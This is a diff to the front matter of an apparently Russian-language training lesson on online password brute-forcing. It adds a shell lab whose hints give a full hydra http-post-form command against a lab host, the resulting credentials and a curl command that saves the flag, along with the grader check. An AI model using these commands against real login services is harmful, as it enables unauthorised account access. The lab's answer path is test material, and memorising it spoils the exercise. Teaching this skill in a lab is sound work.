@@ -13,6 +13,18 @@ useful_for:
   - "Red team: password spraying и онлайн-перебор"
 estimated_minutes: 28
 summary: "Онлайн-подбор учётных данных: полный справочник hydra (все модули сервисов, http-post-form), эквиваленты medusa, модульный patator, генерация курированных словарей и правила безопасного перебора без блокировки аккаунта."
+lab:
+  kind: shell
+  title: "Практика: онлайн-брут hydra по http-post-form"
+  toolset: [core, hydra, curl]
+  workdir: /home/student/task
+  files: [task.md, notes.txt, login_server.py, pass.txt, response.txt]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - "Посмотри словарь и fail-string: `cat pass.txt`, `cat response.txt`."
+    - "Запусти hydra по форме: `hydra -l admin -P pass.txt 10.0.0.5 http-post-form \"/login:username=^USER^&password=^PASS^:F=Invalid credentials\"`."
+    - "hydra покажет найденный пароль — используй его в curl."
+    - "Сохрани флаг: `curl -u admin:Summer2025! http://10.0.0.5/admin | grep nto > found.txt`."
 ---
 
 ## Вопрос, с которого всё начинается
